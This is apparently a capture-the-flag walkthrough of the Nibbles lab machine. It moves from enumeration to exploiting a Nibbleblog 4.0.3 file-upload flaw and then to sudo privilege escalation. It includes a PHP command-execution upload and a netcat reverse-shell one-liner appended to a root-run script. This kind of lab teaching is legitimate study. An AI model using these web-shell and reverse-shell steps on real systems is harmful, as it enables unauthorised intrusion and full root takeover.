## Enumeration
We begin with basic enumeration, starting with a port scan using `nmap` to identify open ports and services. The scan reveals port 80 and 22 are open, indicating a web server is running on port 80 and SSH on port 22.

The task requires that we find the Apache version running on the server, so we can use `nmap -sV -p 80 [ip]` to determine that it's `Apache 2.4.18`.
### Web Footprinting

We can use `whatweb` to determine the web application in use:

```shellsession
$ whatweb 10.129.211.246:80  

http://10.129.211.246:80 [200 OK] Apache[2.4.18], Country[RESERVED][ZZ], HTTPServer[Ubuntu Linux][Apache/2.4.18 (Ubuntu)], IP[10.129.211.246]
```

This doesn't reveal much, and browsing to the target in a web browser just displays "Hello World!":

![[Pasted image 20260915145738.png]]

However, looking in the source reveal an interesting comment:

```html
<!-- /nibbleblog/ directory. Nothing interesting here! -->
```

 Navigating to this page reveals the skeleton of a blog:

![[Pasted image 20260915145823.png]]

The `Atom` and `Powered by Nibbleblog` in the bottom left look interesting! We can run `whatweb` again to see if anything else interesting is revealed:

```shellsession
$whatweb [ip]

http://10.129.211.246/nibbleblog/ [200 OK] Apache[2.4.18], Cookies[PHPSESSID], Country[RESERVED][ZZ], HTML5, HTTPServer[Ubuntu Linux][Apache/2.4.18 (Ubuntu)], IP[10.129.211.246], JQuery, MetaGenerator[Nibbleblog], PoweredBy[Nibbleblog], Script, Title[Nibbles - Yum yum]
```

This confirms that the web application runs `Nibbleblog`, as well as revealing the use of `HTML5`, `JQuery` and `PHP`. A couple of exploits exist for `Nibbleblog`, however we do not know whether the target is running a vulnerable version, so we will need to enumerate further to find out.
### Directory Enumeration
We'll continue by running `gobuster` to find any other hidden directories or files:
```shellsession
$ gobuster dir -u http://10.129.211.246/nibbleblog/ --wordlist /usr/share/seclists/Discovery/Web-Content/common.txt

[...]
.htaccess            (Status: 403) [Size: 309]
.htpasswd            (Status: 403) [Size: 309]
.hta                 (Status: 403) [Size: 304]
README               (Status: 200) [Size: 4628]
admin                (Status: 301) [Size: 327] [--> http://10.129.211.246/nibbleblog/admin/]

admin.php            (Status: 200) [Size: 1401]
content              (Status: 301) [Size: 329] [--> http://10.129.211.246/nibbleblog/content/]

index.php            (Status: 200) [Size: 2987]
languages            (Status: 301) [Size: 331] [--> http://10.129.211.246/nibbleblog/languages/]

plugins              (Status: 301) [Size: 329] [--> http://10.129.211.246/nibbleblog/plugins/]

themes               (Status: 301) [Size: 328] [--> http://10.129.211.246/nibbleblog/themes/]

Progress: 4750 / 4750 (100.00%)
```

`cURL` can be used to check the `README` file, which reveals the version of `Nibbleblog`:

```html
====== Nibbleblog ======
Version: v4.0.3
Codename: Coffee
Release date: 2014-04-01
```

Amazing! We've found the version of `Nibbleblog` running on the target, `4.0.3`. We can now use `searchsploit` to find any public exploits for this version:

```shellsession
$ searchsploit -w nibbleblog

Nibbleblog 3 - Multiple SQL Injections| https://www.exploit-db.com/exploits/35865

Nibbleblog 4.0.3 - Arbitrary File Upload (Metasploit) | https://www.exploit-db.com/exploits/38489
```

Great! We've found an RCE exploit for `Nibbleblog 4.0.3`! Navigating to the provided URL, then to the CVE page, we can read more about the vulnerability. The key detail right now, however, is that the exploit requires us to be logged in as an administrator (*allows **remote administrators** to execute arbitrary code*). It is also possible that this `README` file is outdated, so let's continue enumerating for now.

Looking at our `gobuster` results, we can see that there is an `admin` directory. Navigating to this page reveals a login page:

![[Pasted image 20260915150142.png]]

Guessing at some default credentials such as `admin:admin` or `admin:password` does not work, and *Forgot Password* just leads to an email error.

>**Note:**
>*Don't search for default credentials online! I thought I was very clever for doing this and finding the login, until I realised it was google's ai summary just spoiling the lab for me :/*

Let's go back to our `gobuster` results and see what we can find. We can visit one of the subdirectories and find out that directory listing is enabled, which is great for us! Exploring the `/content` subdirectory, we'll find a `users.txt` file. While this doesn't contain the password, it does confirm the admin's username, `admin`. So, at the moment, we have:

- A Nibbleblog installation likely to be running version `4.0.3`. We'll need an admin login to exploit this however.
- An admin login portal at nibbleblog/admin, with the username `admin` but no password yet.
- Login brute-forcing protections (which you may have noticed when guessing the default password)

There's no other open ports nor directories (which we can confirm with a `gobuster` scan on the root directory). However, there is an interesting file: `/content/private/config.xml` we should look through. Unfortunately, there's too interesting here.

We've reached a bit of a dead-end here. The solution is to use a little creative thinking. We keep seeing the word `nibbles` everywhere, and the lab is called `nibbles`. It appears so much that it might appear in the password for the admin account. It's a longshot but if you try it you'll find that the password is indeed `nibbles`. We can now log in to the admin panel and exploit the RCE vulnerability to get a shell on the target machine.

>**Note:** We can use a tool such as [CeWL](https://github.com/digininja/CeWL) to crawl a webpage and generate a custom word-list if we want to be a bit more clever about doing this.
### Admin Enumeration
So, we've logged in as an admin and we know that a RCE vulnerability exists. Before we begin exploiting, lets poke around here and see if anything else might show up.

If you're familiar at all with common web exploits, there's a lot that looks intriguing here. Let's focus on the *My Image* plugin. This lets admins upload images that can be selected from when posting to the blog. However, as you might suspect, there seems to be no controls on what type of file we upload. Trying an empty `test.php`, for example, throws a bunch of errors, but still says that the upload was successful. If we navigate to `http://10.129.212.52/nibbleblog/content/private/plugins/my_image/`, we'll see a new `image.php` file has appeared. 

Lets alter our `php` file to run the `id` command: `<?php system('id'); ?>`. Uploading this new file overwrites the previous one, and this time opening it shows the following:

```html
uid=1001(nibbler) gid=1001(nibbler) groups=1001(nibbler)
```

Nice! We've gained RCE on the webserver, and the Apache server is running in the `nibbler` user context. Now let's modify the `php` to obtain a reverse shell, then upgrade it to a TTY. See [[shells#Reverse Shell |shells]] for how we can do this.

Once we've achieved this, we can navigate to `/home/nibbler` and run `cat user.txt` to find a flag.

## Privilege Escalation
We now have an upgraded reverse shell! Let's try to escalate things. Again, see [[privilege-escalation]] for more detail on how we can do this. 

We'll begin with more enumeration. We'll need to find something to exploit to find escalate our privileges! To do this, we'll use [LinEnum.sh](https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh). We begin on our attacker machine by downloading this script, then starting a `python` server with `sudo python3 -m http.server 8080`. Then, from our remote shell, we can download the file with `wget http://[our-ip]/LinEnum.sh`. Make the script executable with `chmod +x LinEnum.sh` and then run it.

Scrolling through the output, we'll find something promising quite early on:

```shellsession
[+] We can sudo without supplying a password!
Matching Defaults entries for nibbler on Nibbles:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User nibbler may run the following commands on Nibbles:
    (root) NOPASSWD: /home/nibbler/personal/stuff/monitor.sh

[+] Possible sudo pwnage!
/home/nibbler/personal/stuff/monitor.sh
```

The `nibbler` user is able to run `monitor.sh` with `root` privilege. When we first gained our shell, we noticed the `user.txt` file containing a flag, but we glossed over `personal.zip`. Unzipping this and looking inside reveals `monitor.sh`, which `nibbler` is able to edit (we can check this with `ls -l`) . So, we have a file we're able to edit and run as `root`. That seems pretty dangerous!

Before we do anything, **we must make sure to make a backup of the file and only append changes to the end to avoid overwriting it and causing a disruption!**

Let's append a reverse shell line to the end, spawn an `nc` listener on the specified port and execute with `sudo`:

```shellsession
echo 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc [our ip] 8443 >/tmp/f' | tee -a monitor.sh
```

We'll upgrade that to a TTY as before, then we can run `cat root.txt` to get the next flag!

## Metasploit
We saw earlier that there existed a `Metasploit` module that works for this box. It's considerably more straightforward but it's useful to see multiple techniques. Let's close down our reverse shells and work on this.

